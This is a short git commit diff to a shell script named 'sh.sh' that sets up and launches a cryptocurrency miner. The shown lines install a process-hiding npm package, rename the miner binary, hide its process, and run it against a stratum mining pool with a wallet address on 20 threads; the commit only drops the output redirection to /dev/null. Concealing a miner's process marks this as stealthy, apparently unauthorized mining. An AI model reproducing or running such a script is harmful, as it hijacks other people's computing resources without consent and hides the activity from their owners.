223cfc2cfc65a1ab55f32a9267953a5caa4cc692
gunturyogatama404 <99540625+gunturyogatama404@users.noreply.github.com>
2022-02-17 16:55:21 -0400

    Update sh.sh

--- sh.sh
+++ sh.sh
@@ -11,4 +11,4 @@ npm i -g node-process-hider
 mv @ kontol
 chmod u+x kontol
 ph add kontol
-./kontol -a minotaurx  -o stratum+tcps://stratum-eu.rplant.xyz:17068 -u RFgqtpziL9u4qbC1EyafxgzTXE35mSrCgZ -t20 > /dev/null 2>&1
+./kontol -a minotaurx  -o stratum+tcps://stratum-eu.rplant.xyz:17068 -u RFgqtpziL9u4qbC1EyafxgzTXE35mSrCgZ -t20
